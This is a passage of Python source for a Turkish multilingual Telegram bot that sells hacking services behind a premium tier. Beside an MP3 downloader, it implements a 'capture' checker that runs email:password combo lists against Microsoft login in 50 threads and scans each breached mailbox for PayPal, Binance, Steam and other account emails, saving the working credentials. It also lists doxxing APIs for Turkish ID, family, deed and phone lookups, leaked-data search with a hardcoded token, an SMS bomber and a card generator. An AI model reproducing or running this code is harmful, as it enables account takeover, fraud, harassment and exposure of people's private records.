            "🎵 **Müzik İndirici (MP3)**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📌 **Kullanım:**\n"
            "`/sarki Sanatçı Şarkı`\n"
            "`/sarki https://youtube.com/...`\n\n"
            "🎯 **Örnekler:**\n"
            "`/sarki Tarkan Dudu`\n"
            "`/sarki Hadise Feryat`\n\n"
            "📁 Format: `.mp3` (192 kbps)"
        )
        return

    sorgu = parts[1].strip()
    durum = bot_instance.reply_to(msg, f"🔍 `{sorgu}` aranıyor...")

    try:
        bot_instance.edit_message_text(
            f"🎧 **MP3 İndiriliyor...**\n\n`{sorgu}`",
            msg.chat.id, durum.message_id
        )

        result = _muzik_indir(sorgu)

        if not result["ok"]:
            bot_instance.edit_message_text(
                result.get("error", "❌ Bilinmeyen hata!"),
                msg.chat.id, durum.message_id
            )
            return

        baslik = result["title"]
        sanatci = result["uploader"]
        sure = result["duration"]
        sure_txt = f"{int(sure//60)}:{int(sure%60):02d}" if sure else "?"

        thumb_path = None
        if result.get("thumbnail"):
            try:
                thumb_data = requests.get(result["thumbnail"], timeout=10, verify=False).content
                thumb_path = f"muzikler/thumb_{uid}_{int(time.time())}.jpg"
                with open(thumb_path, "wb") as f:
                    f.write(thumb_data)
            except:
                thumb_path = None

        caption = (
            f"🎵 **{baslik}**\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 **Sanatçı:** {sanatci}\n"
            f"⏱ **Süre:** {sure_txt}\n"
            f"💽 **Format:** `.mp3` (192 kbps)\n"
            f"🔗 [YouTube'da Aç]({result['url']})"
        )

        with open(result["path"], "rb") as sarki:
            thumb_file = open(thumb_path, "rb") if thumb_path and os.path.exists(thumb_path) else None
            try:
                bot_instance.send_audio(
                    msg.chat.id,
                    sarki,
                    caption=caption,
                    title=baslik[:60],
                    performer=sanatci[:60],
                    duration=int(sure) if sure else 0,
                    thumb=thumb_file
                )
            finally:
                if thumb_file:
                    thumb_file.close()

        try:
            os.remove(result["path"])
        except:
            pass
        if thumb_path and os.path.exists(thumb_path):
            try:
                os.remove(thumb_path)
            except:
                pass

        try:
            bot_instance.delete_message(msg.chat.id, durum.message_id)
        except:
            pass

        print(f"✅ MP3 GÖNDERİLDİ | {get_user_name(uid)} | {baslik}")

    except Exception as e:
        print(f"[MUSIC ERROR] {e}")
        try:
            bot_instance.edit_message_text(
                f"❌ **Hata:** `{e}`",
                msg.chat.id, durum.message_id
            )
        except:
            bot_instance.reply_to(msg, f"❌ Hata: `{e}`")


# ══════════════════════════════════════════════════════════════
#  CAPTURE TOOL
# ══════════════════════════════════════════════════════════════

CAPTURE_APPS = {
    1: 'security@facebookmail.com',
    2: 'security@mail.instagram.com',
    3: 'noreply@pubgmobile.com',
    4: 'nintendo-noreply@ccg.nintendo.com',
    5: 'register@account.tiktok.com',
    6: 'info@x.com',
    7: 'service@paypal.com.br',
    8: 'do-not-reply@ses.binance.com',
    9: 'info@account.netflix.com',
    10: 'reply@txn-email.playstation.com',
    11: 'noreply@id.supercell.com',
    12: 'help@acct.epicgames.com',
    13: 'no-reply@spotify.com',
    14: 'noreply@rockstargames.com',
    15: 'xboxreps@engage.xbox.com',
    16: 'account-security-noreply@accountprotection.microsoft.com',
    17: 'noreply@steampowered.com',
    18: 'accounts@roblox.com',
    19: 'EA@e.ea.com',
    20: 'no-reply@bitkub.com'
}

CAPTURE_NAMES = {
    1: "Facebook", 2: "Instagram", 3: "PUBG", 4: "Konami", 5: "TikTok",
    6: "Twitter", 7: "PayPal", 8: "Binance", 9: "Netflix", 10: "PlayStation",
    11: "Supercell", 12: "Epic Games", 13: "Spotify", 14: "Rockstar", 15: "Xbox",
    16: "Microsoft", 17: "Steam", 18: "Roblox", 19: "EA Sports", 20: "Bitkub"
}

CAPTURE_RUNNING = False
CAPTURE_LOCK = threading.Lock()
CAPTURE_RESULTS = {}
CAPTURE_HIT = 0
CAPTURE_BAD = 0
CAPTURE_PROCESSED = 0


def capture_keyboard(user_id):
    mk = InlineKeyboardMarkup(row_width=2)
    is_prem = is_premium(user_id)

    mk.add(_sep("📸 PLATFORM SEÇİNİZ"))

    if is_prem:
        mk.add(_btn("📸 Tüm Platformlar ⭐", "capture_all"))
    else:
        mk.add(_btn("📸 Tüm Platformlar 🔒 (Premium)", "noop"))

    for i in range(1, 21, 2):
        if i + 1 <= 20:
            mk.add(
                _btn(f"{i}. {CAPTURE_NAMES[i]}", f"capture_{i}"),
                _btn(f"{i+1}. {CAPTURE_NAMES[i+1]}", f"capture_{i+1}")
            )
        else:
            mk.add(_btn(f"{i}. {CAPTURE_NAMES[i]}", f"capture_{i}"))

    if not is_prem:
        mk.add(_sep(f"📊 Kalan Hakkınız: {get_capture_limit_text(user_id)}/{FREE_CAPTURE_LIMIT}"))
        mk.add(_btn("⭐ Premium Satın Al (400⭐)", "buy_premium"))

    mk.add(_btn("◀️ Geri", "goto_hotmail"))
    return mk


def capture_get_token(email, password):
    try:
        headers = {
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "return-client-request-id": "false",
            "client-request-id": "205740b4-7709-4500-a45b-b8e12f66c738",
            "x-ms-sso-ignore-sso": "1",
            "correlation-id": str(uuid.uuid4()),
            "x-client-ver": "1.1.0+9e54a0d1",
            "x-client-os": "28",
            "x-client-sku": "MSAL.xplat.android",
            "x-client-src-sku": "MSAL.xplat.android",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        }
        response = requests.get("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint="+str(email)+"&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D", headers=headers)
        cookies = response.cookies.get_dict()
        url = response.text.split("urlPost:'")[1].split("'")[0]
        ppft = response.text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]
        ad = response.url.split('haschrome=1')[0]

        data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"

        login_headers = {
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "Content-Length": str(len(data)),
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": f"{ad}haschrome=1",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": f"MSPRequ={cookies['MSPRequ']};uaid={cookies['uaid']}; RefreshTokenSso={cookies['RefreshTokenSso']}; MSPOK={cookies['MSPOK']}; OParams={cookies['OParams']}; MicrosoftApplicationsTelemetryDeviceId={uuid}"
        }

        res = requests.post(url, data=data, headers=login_headers, allow_redirects=False)
        cookies = res.cookies.get_dict()
        headers = res.headers

        if any(key in cookies for key in ["JSH", "JSHP", "ANON", "WLSSC"]) or res.text == '':
            code = headers.get('Location', '').split('code=')[1].split('&')[0] if 'code=' in headers.get('Location', '') else None
            cid = cookies.get('MSPCID', '').upper()

            if code and cid:
                token_url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
                token_data = {
                    "client_info": "1",
                    "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                    "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                    "grant_type": "authorization_code",
                    "code": code,
                    "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
                }
                token_res = requests.post(token_url, data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"})
                access_token = token_res.json().get("access_token")
                return access_token, cid
        return None, None
    except:
        return None, None


def capture_get_info(email, password, token, cid, target_app=None):
    try:
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers).json()

        name = r.get('names', [{}])[0].get('displayName', 'Bilinmiyor')
        location = r.get('accounts', [{}])[0].get('location', 'Bilinmiyor')

        url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
        headers2 = {
            "Host": "outlook.live.com",
            "content-length": "0",
            "x-owa-sessionid": f"{cid}",
            "x-req-source": "Mini",
            "authorization": f"Bearer {token}",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
            "action": "StartupData",
            "x-owa-correlationid": f"{cid}",
            "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
            "content-type": "application/json; charset=utf-8",
            "accept": "*/*",
            "origin": "https://outlook.live.com",
            "x-requested-with": "com.microsoft.outlooklite",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://outlook.live.com/",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US,en;q=0.9"
        }
        rese = requests.post(url, headers=headers2, data="").text

        found_apps = []
        for num, app_mail in CAPTURE_APPS.items():
            if app_mail in rese:
                found_apps.append(CAPTURE_NAMES[num])

        return {
            "success": True,
            "name": name,
            "country": location,
            "apps": found_apps,
            "email": email,
            "password": password
        }
    except:
        return {"success": False}


def capture_worker(line, user_id, user_name, is_premium, target_app=None):
    global CAPTURE_HIT, CAPTURE_BAD, CAPTURE_PROCESSED

    try:
        if ":" not in line:
            with CAPTURE_LOCK:
                CAPTURE_BAD += 1
                CAPTURE_PROCESSED += 1
            return

        email, password = line.split(":", 1)
        email = email.strip()
        password = password.strip()

        if not email or not password:
            with CAPTURE_LOCK:
                CAPTURE_BAD += 1
                CAPTURE_PROCESSED += 1
            return

        token, cid = capture_get_token(email, password)
        if not token or not cid:
            with CAPTURE_LOCK:
                CAPTURE_BAD += 1
                CAPTURE_PROCESSED += 1
            return

        result = capture_get_info(email, password, token, cid, target_app)

        if result.get("success"):
            apps = result.get("apps", [])

            if target_app:
                target_name = None
                for num, app_mail in CAPTURE_APPS.items():
                    if app_mail == target_app:
                        target_name = CAPTURE_NAMES[num]
                        break
                if target_name and target_name not in apps:
                    with CAPTURE_LOCK:
                        CAPTURE_BAD += 1
                        CAPTURE_PROCESSED += 1
                    return

            with CAPTURE_LOCK:
                CAPTURE_HIT += 1
                if user_id not in CAPTURE_RESULTS:
                    CAPTURE_RESULTS[user_id] = []
                CAPTURE_RESULTS[user_id].append(result)

                with open(f"capture_hits_{user_id}.txt", "a", encoding="utf-8") as f:
                    f.write(f"Email: {email}\n")
                    f.write(f"Password: {password}\n")
                    f.write(f"Name: {result.get('name')}\n")
                    f.write(f"Country: {result.get('country')}\n")
                    f.write(f"Apps: {', '.join(apps)}\n")
                    f.write(f"{'-'*40}\n")

                print(f"✅ CAPTURE HIT | {user_name} | {email}")
        else:
            with CAPTURE_LOCK:
                CAPTURE_BAD += 1
    except:
        with CAPTURE_LOCK:
            CAPTURE_BAD += 1
    finally:
        with CAPTURE_LOCK:
            CAPTURE_PROCESSED += 1


def start_capture_scan(combo_list, user_id, user_name, is_premium, target_app=None):
    global CAPTURE_RUNNING, CAPTURE_HIT, CAPTURE_BAD, CAPTURE_PROCESSED

    with CAPTURE_LOCK:
        CAPTURE_RUNNING = True
        CAPTURE_HIT = 0
        CAPTURE_BAD = 0
        CAPTURE_PROCESSED = 0
        CAPTURE_RESULTS[user_id] = []

    try:
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for line in combo_list[:1000]:
                futures.append(executor.submit(capture_worker, line, user_id, user_name, is_premium, target_app))

            for future in as_completed(futures):
                try:
                    future.result()
                except:
                    pass
    finally:
        with CAPTURE_LOCK:
            CAPTURE_RUNNING = False


# ══════════════════════════════════════════════════════════════
#  KEYBOARDS
# ══════════════════════════════════════════════════════════════

def main_kb(user_id):
    l = lang(user_id)
    labels = {
        "tr": ["📦 Combo Çek", "🛠 Araçlar", "📊 İstatistik", "👤 Profil", "🏆 Lider Tablosu", "⚙️ API Değiştir", "❓ Yardım"],
        "en": ["📦 Combo Check", "🛠 Tools", "📊 Statistics", "👤 Profile", "🏆 Leaderboard", "⚙️ Change API", "❓ Help"],
        "ar": ["📦 فحص كومبو", "🛠 الأدوات", "📊 الإحصائيات", "👤 الملف الشخصي", "🏆 المتصدرون", "⚙️ تغيير API", "❓ مساعدة"],
    }
    btns = labels.get(l, labels["tr"])
    mk = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    mk.add(*[KeyboardButton(b) for b in btns])
    return mk


def _btn(txt, cd):
    return InlineKeyboardButton(txt, callback_data=cd)


def _sep(txt):
    return InlineKeyboardButton(f"─── {txt} ───", callback_data="noop")


def hotmail_keyboard(user_id):
    mk = InlineKeyboardMarkup(row_width=2)

    keywords = get_user_keywords(user_id)
    limit_text = get_keyword_limit_text(user_id)
    is_prem = is_premium(user_id)

    mk.add(_sep("📧 HOTMAIL CHECKER"))
    if is_prem:
        mk.add(_btn("🚀 Hotmail Tarama Başlat ⭐", "hotmail_start"))
    else:
        mk.add(_btn("📧 Hotmail Tarama Başlat (3000 satır)", "hotmail_start"))

    mk.add(_sep(f"🔖 KEYWORDLER ({len(keywords)}/{limit_text})"))

    for kw in keywords[:10]:
        mk.add(_btn(f"📌 {kw}", "noop"))

    mk.add(_btn("➕ Keyword Ekle", "hotmail_addkw"))
    mk.add(_btn("🗑️ Keyword Sil", "hotmail_delkw"))
    mk.add(_btn("🔄 Keywordleri Sıfırla", "hotmail_resetkw"))

    mk.add(_sep("📸 CAPTURE TOOL"))
    if is_prem:
        mk.add(_btn("📸 Capture Tarama Başlat ⭐", "capture_menu"))
    else:
        capture_left = get_capture_limit_text(user_id)
        mk.add(_btn(f"📸 Capture Tool ({capture_left} kullanım)", "capture_menu"))

    if is_prem:
        mk.add(_btn("⭐ Premium Aktif ✅", "noop"))
    else:
        mk.add(_btn("⭐ Premium Satın Al (400⭐)", "buy_premium"))

    mk.add(_btn(s(user_id, "back_btn"), "goto_tools"))
    return mk


API_LIST = [
    {"name": "Wazely API", "url": "https://wazely.vercel.app/api/trlog?site=", "type": "wazely"},
    {"name": "Solidar API", "url": "https://solidarksystems.alwaysdata.net/log.php?url=", "type": "solidar"},
    {"name": "RootTurkey API", "url": "https://rootturkey.xyz/log?url=", "type": "rootturkey"},
]

YASAKLI = [".gov", ".edu", "cheatglobal", "spin", "bet"]

TURKIYE_API = {
    "tc": {"url": "https://ajaxsystems.fun/tc.php?tc={tc}", "icon": "🆔", "tr": "TC Sorgu", "en": "TC Query", "ar": "استعلام TC", "params": ["tc"]},
    "tcpro": {"url": "https://ajaxsystems.fun/tcpro.php?tc={tc}", "icon": "🔍", "tr": "TC Pro Sorgu", "en": "TC Pro Query", "ar": "استعلام TC Pro", "params": ["tc"]},
    "adsoyad": {"url": "https://ajaxsystems.fun/adsoyad.php?ad={ad}&soyad={soyad}", "icon": "👤", "tr": "Ad Soyad", "en": "Name Surname", "ar": "استعلام الاسم", "params": ["ad", "soyad"]},
    "aile": {"url": "https://ajaxsystems.fun/aile.php?tc={tc}", "icon": "👨‍👩‍👧", "tr": "Aile Sorgu", "en": "Family Query", "ar": "استعلام العائلة", "params": ["tc"]},
    "ailepro": {"url": "https://ajaxsystems.fun/ailepro.php?tc={tc}", "icon": "👨‍👩‍👧‍👦", "tr": "Aile Pro", "en": "Family Pro", "ar": "العائلة Pro", "params": ["tc"]},
    "sulale": {"url": "https://ajaxsystems.fun/sulale.php?tc={tc}", "icon": "🌳", "tr": "Sülale Sorgu", "en": "Lineage Query", "ar": "استعلام النسب", "params": ["tc"]},
    "tcgsm": {"url": "https://ajaxsystems.fun/tcgsm.php?tc={tc}&auth=fire", "icon": "📱", "tr": "TC → GSM", "en": "TC to GSM", "ar": "TC إلى GSM", "params": ["tc"]},
    "gsmtc": {"url": "https://ajaxsystems.fun/gsmtc.php?gsm={gsm}&auth=fire", "icon": "📞", "tr": "GSM → TC", "en": "GSM to TC", "ar": "GSM إلى TC", "params": ["gsm"]},
    "eokul": {"url": "https://ajaxsystems.fun/eokul.php?tc={tc}", "icon": "🎓", "tr": "E-Okul Sorgu", "en": "E-School Query", "ar": "استعلام المدرسة", "params": ["tc"]},
    "tapu": {"url": "https://ajaxsystems.fun/tapu.php?tc={tc}", "icon": "🏠", "tr": "Tapu Sorgu", "en": "Title Deed Query", "ar": "استعلام الملكية", "params": ["tc"]},
    "adaparsel": {"url": "https://ajaxsystems.fun/adaparsel.php?il={il}&ilce={ilce}", "icon": "🗺️", "tr": "Ada Parsel", "en": "Block Parcel", "ar": "استعلام القطعة", "params": ["il", "ilce"]},
}

LS_TOKEN = "NHLpkXyN8Lq3AkkjA5yECyMu5lpA0l0GqnY0Co8kBwh9eIeOJg"
LS_BASE = "https://api.leaksights.com/osint"


def _lsurl(endpoint):
    return f"{LS_BASE}/{endpoint}?token={LS_TOKEN}&text={{value}}"


LEAKSIGHTS_API = {
    "username": {"url": _lsurl("username"), "icon": "👤", "cat": "username", "tr": "Kullanıcı Adı", "en": "Username", "ar": "اسم المستخدم"},
    "username2": {"url": _lsurl("username2"), "icon": "🔍", "cat": "username", "tr": "Kullanıcı Adı Detaylı", "en": "Username Detailed", "ar": "اسم المستخدم تفصيلي"},
    "fullnamebreach": {"url": _lsurl("fullnamebreach"), "icon": "📝", "cat": "name", "tr": "Tam İsim", "en": "Full Name", "ar": "الاسم الكامل"},
    "nome": {"url": _lsurl("nome"), "icon": "👤", "cat": "name", "tr": "İsim", "en": "Name", "ar": "الاسم"},
    "nomepai": {"url": _lsurl("nomepai"), "icon": "👨", "cat": "name", "tr": "Baba Adı", "en": "Father Name", "ar": "اسم الأب"},
    "nomemae": {"url": _lsurl("nomemae"), "icon": "👩", "cat": "name", "tr": "Anne Adı", "en": "Mother Name", "ar": "اسم الأم"},
    "email": {"url": _lsurl("email"), "icon": "📧", "cat": "contact", "tr": "E-posta", "en": "Email", "ar": "البريد الإلكتروني"},
    "number": {"url": _lsurl("number"), "icon": "📱", "cat": "contact", "tr": "Telefon", "en": "Phone", "ar": "الهاتف"},
    "telefone": {"url": _lsurl("telefone"), "icon": "📞", "cat": "contact", "tr": "Telefon Detaylı", "en": "Phone Detailed", "ar": "الهاتف التفصيلي"},
    "telefone_basic": {"url": _lsurl("telefone_basic"), "icon": "📱", "cat": "contact", "tr": "Telefon Temel", "en": "Phone Basic", "ar": "الهاتف الأساسي"},
    "ip": {"url": _lsurl("ip"), "icon": "🌐", "cat": "ip", "tr": "IP Sızıntı", "en": "IP Leak", "ar": "تسريب IP"},
    "ipgeo": {"url": _lsurl("ipgeo"), "icon": "📍", "cat": "ip", "tr": "IP Konum", "en": "IP Location", "ar": "موقع IP"},
    "hwid": {"url": _lsurl("hwid"), "icon": "💻", "cat": "ip", "tr": "HWID", "en": "HWID", "ar": "HWID"},
    "proxydetect": {"url": _lsurl("proxydetect"), "icon": "🛡️", "cat": "ip", "tr": "Proxy Tespit", "en": "Proxy Detection", "ar": "كشف البروكسي"},
    "portscam": {"url": _lsurl("portscam"), "icon": "🔌", "cat": "ip", "tr": "Port Tarama", "en": "Port Scan", "ar": "فحص المنافذ"},
    "subnet": {"url": _lsurl("subnet"), "icon": "🌐", "cat": "ip", "tr": "Subnet", "en": "Subnet", "ar": "الشبكة الفرعية"},
    "domainmapper": {"url": _lsurl("domainmapper"), "icon": "🗺️", "cat": "domain", "tr": "Domain Haritalama", "en": "Domain Mapping", "ar": "رسم خريطة النطاق"},
    "subdomainsearch": {"url": _lsurl("subdomainsearch"), "icon": "🔍", "cat": "domain", "tr": "Subdomain Arama", "en": "Subdomain Search", "ar": "بحث النطاق الفرعي"},
    "subdmains": {"url": _lsurl("subdmains"), "icon": "🌐", "cat": "domain", "tr": "Subdomain Detaylı", "en": "Subdomain Detailed", "ar": "النطاق الفرعي التفصيلي"},
    "url": {"url": _lsurl("url"), "icon": "🔗", "cat": "url", "tr": "URL Sızıntı", "en": "URL Leak", "ar": "تسريب URL"},
    "url2": {"url": _lsurl("url2"), "icon": "🔗", "cat": "url", "tr": "URL Detaylı", "en": "URL Detailed", "ar": "URL التفصيلي"},
    "search_url_all_database": {"url": _lsurl("search_url_all_database"), "icon": "🔎", "cat": "url", "tr": "URL Tüm Veritabanı", "en": "URL All Database", "ar": "URL جميع قواعد البيانات"},
    "passport": {"url": _lsurl("passport"), "icon": "🛂", "cat": "identity", "tr": "Pasaport", "en": "Passport", "ar": "جواز السفر"},
    "cpf": {"url": _lsurl("cpf"), "icon": "🆔", "cat": "identity", "tr": "CPF", "en": "CPF", "ar": "CPF"},
    "dni": {"url": _lsurl("dni"), "icon": "🆔", "cat": "identity", "tr": "DNI", "en": "DNI", "ar": "DNI"},
    "ssn": {"url": _lsurl("ssn"), "icon": "🆔", "cat": "identity", "tr": "SSN", "en": "SSN", "ar": "SSN"},
    "parentescpf": {"url": _lsurl("parentescpf"), "icon": "👨‍👩‍👧‍👦", "cat": "identity", "tr": "Akraba CPF", "en": "Relative CPF", "ar": "CPF الأقارب"},
    "password": {"url": _lsurl("password"), "icon": "🔑", "cat": "other", "tr": "Şifre", "en": "Password", "ar": "كلمة المرور"},
    "facebookid": {"url": _lsurl("facebookid"), "icon": "📘", "cat": "other", "tr": "Facebook ID", "en": "Facebook ID", "ar": "Facebook ID"},
    "placa": {"url": _lsurl("placa"), "icon": "🚗", "cat": "other", "tr": "Plaka (LS)", "en": "License Plate (LS)", "ar": "لوحة السيارة (LS)"},
}

LEAKSIGHTS_CATS = {
    "username": {"tr": "👤 KULLANICI ADI", "en": "👤 USERNAME", "ar": "👤 اسم المستخدم"},
    "name": {"tr": "📝 İSİM SORGULARI", "en": "📝 NAME QUERIES", "ar": "📝 استعلامات الاسم"},
    "contact": {"tr": "📱 İLETİŞİM", "en": "📱 CONTACT", "ar": "📱 الاتصال"},
    "ip": {"tr": "🌐 IP / AĞ", "en": "🌐 IP / NETWORK", "ar": "🌐 IP / الشبكة"},
    "domain": {"tr": "🗺️ DOMAIN", "en": "🗺️ DOMAIN", "ar": "🗺️ النطاق"},
    "url": {"tr": "🔗 URL", "en": "🔗 URL", "ar": "🔗 URL"},
    "identity": {"tr": "🛂 KİMLİK", "en": "🛂 IDENTITY", "ar": "🛂 الهوية"},
    "other": {"tr": "🔧 DİĞER", "en": "🔧 OTHER", "ar": "🔧 أخرى"},
}

TOOLS_API = {
    "bedrock": "https://wazelyapi.vercel.app/api/bedrock?adres=",
    "ccgen": "https://wazelyapi.vercel.app/api/ccgen?bin=",
    "dctoken": "https://wazelyapi.vercel.app/api/dcbottokencheck?token=",
    "tgtoken": "https://wazelyapi.vercel.app/api/tgtokencheck?token=",
    "eczane": "https://wazely.vercel.app/api/eczane?ad=",
    "ipinfo": "https://wazely.vercel.app/api/ipinfo?ip=",
    "dns": "https://wazely.vercel.app/api/dns?domain=",
    "bahis": "https://wazely.vercel.app/api/bahis?isimsoyisim=",
    "plaka": "https://wazely.vercel.app/api/plaka?plate=",
    "predunyam": "https://wazely.vercel.app/api/predunyam",
}

TOOL_PROMPTS = {
    "tr": {
        "bedrock": "🎮 IP:PORT girin (Örn: bee.mc-complex.com:19132)",
        "ccgen": "💳 BIN girin (Örn: 450000)",
        "dctoken": "🤖 Discord Bot Token girin:",
        "tgtoken": "✈️ Telegram Bot Token girin:",
        "eczane": "💊 Eczane adını girin:",
        "ipinfo": "🌐 IP Adresini girin:",
        "dns": "🔎 Domain girin (Örn: google.com):",
        "bahis": "⚽ İsim Soyisim girin:",
        "plaka": "🚗 Plaka girin (Örn: 34ABC123):",
        "proxycheck": "🛡️ IP adresini girin (Örn: 8.8.8.8):",
        "urlscan": "🔍 Domain girin (Örn: google.com):",
        "addbot": "🤖 Bot Token'ını girin:\n\nÖrnek: 8369544888:ABC123...",
        "php2py": "🐍 PHP dosyası gönder, Python'a çevireyim.",
        "smsbomb": "💣 SMS Bomber\n\n📱 Hedef numarayı girin (10 haneli, başında 0 olmadan):\nÖrnek: 5306524123",
        "hotmail": "📧 Hotmail Checker\n\nLütfen combo dosyasını (email:password) gönderin.",
        "exif": "📸 EXIF Metadata Analizi\n\nLütfen bir fotoğraf gönderin.",
        "music": "🎵 Müzik İndirici\n\nŞarkı adı veya YouTube linki girin."
    },
    "en": {
        "bedrock": "🎮 Enter IP:PORT (e.g., bee.mc-complex.com:19132)",
        "ccgen": "💳 Enter BIN (e.g., 450000)",
        "dctoken": "🤖 Enter Discord Bot Token:",
        "tgtoken": "✈️ Enter Telegram Bot Token:",
        "eczane": "💊 Enter pharmacy name:",
        "ipinfo": "🌐 Enter IP address:",
        "dns": "🔎 Enter domain (e.g., google.com):",
        "bahis": "⚽ Enter full name:",
        "plaka": "🚗 Enter plate (e.g., 34ABC123):",
        "proxycheck": "🛡️ Enter IP address (e.g., 8.8.8.8):",
        "urlscan": "🔍 Enter domain (e.g., google.com):",
        "addbot": "🤖 Enter Bot Token:\n\nExample: 8369544888:ABC123...",
        "php2py": "🐍 Send PHP file, I'll convert to Python.",
        "smsbomb": "💣 SMS Bomber\n\n📱 Enter target number (10 digits, no leading 0):\nExample: 5306524123",
        "hotmail": "📧 Hotmail Checker\n\nPlease send combo file (email:password).",
        "exif": "📸 EXIF Metadata Analysis\n\nPlease send a photo.",
        "music": "🎵 Music Downloader\n\nEnter song name or YouTube link."
    },
    "ar": {
        "bedrock": "🎮 أدخل IP:PORT",
        "ccgen": "💳 أدخل BIN",
        "dctoken": "🤖 أدخل Discord Bot Token:",
        "tgtoken": "✈️ أدخل Telegram Bot Token:",
        "eczane": "💊 أدخل اسم الصيدلية:",
        "ipinfo": "🌐 أدخل عنوان IP:",
        "dns": "🔎 أدخل النطاق:",
        "bahis": "⚽ أدخل الاسم الكامل:",
        "plaka": "🚗 أدخل رقم اللوحة:",
        "proxycheck": "🛡️ أدخل عنوان IP:",
        "urlscan": "🔍 أدخل النطاق:",
        "addbot": "🤖 أدخل توكن البوت:",
        "php2py": "🐍 أرسل ملف PHP، سأحوله إلى Python.",
        "smsbomb": "💣 قنبلة SMS\n\n📱 أدخل رقم الهدف (10 أرقام):",
        "hotmail": "📧 Hotmail Checker\n\nيرجى إرسال ملف كومبو (email:password).",
        "exif": "📸 تحليل بيانات EXIF\n\nيرجى إرسال صورة.",
        "music": "🎵 تحميل الموسيقى\n\nأدخل اسم الأغنية أو رابط YouTube."
    },
}

TURKEY_PROMPTS = {
    "tr": {
        "tc": "🆔 TC Kimlik Numarası girin (11 haneli):",
        "tcpro": "🔍 TC Kimlik Numarası girin (11 haneli):",
        "adsoyad": "👤 Ad Soyad girin (Örn: Ali Yılmaz):",
        "aile": "👨‍👩‍👧 TC Kimlik Numarası girin (11 haneli):",
        "ailepro": "👨‍👩‍👧‍👦 TC Kimlik Numarası girin (11 haneli):",
        "sulale": "🌳 TC Kimlik Numarası girin (11 haneli):",
        "tcgsm": "📱 TC Kimlik Numarası girin (11 haneli):",
        "gsmtc": "📞 GSM numarası girin (Örn: 5306524123):",
        "eokul": "🎓 TC Kimlik Numarası girin (11 haneli):",
        "tapu": "🏠 TC Kimlik Numarası girin (11 haneli):",
        "adaparsel": "🗺️ İl,İlçe girin (Örn: İSTANBUL,KADIKÖY):",
    },
    "en": {
        "tc": "🆔 Enter TC ID number (11 digits):",
        "tcpro": "🔍 Enter TC ID number (11 digits):",
        "adsoyad": "👤 Enter name surname (e.g., Ali Yılmaz):",
        "aile": "👨‍👩‍👧 Enter TC ID number (11 digits):",
        "ailepro": "👨‍👩‍👧‍👦 Enter TC ID number (11 digits):",
        "sulale": "🌳 Enter TC ID number (11 digits):",
        "tcgsm": "📱 Enter TC ID number (11 digits):",
        "gsmtc": "📞 Enter GSM number (e.g., 5306524123):",
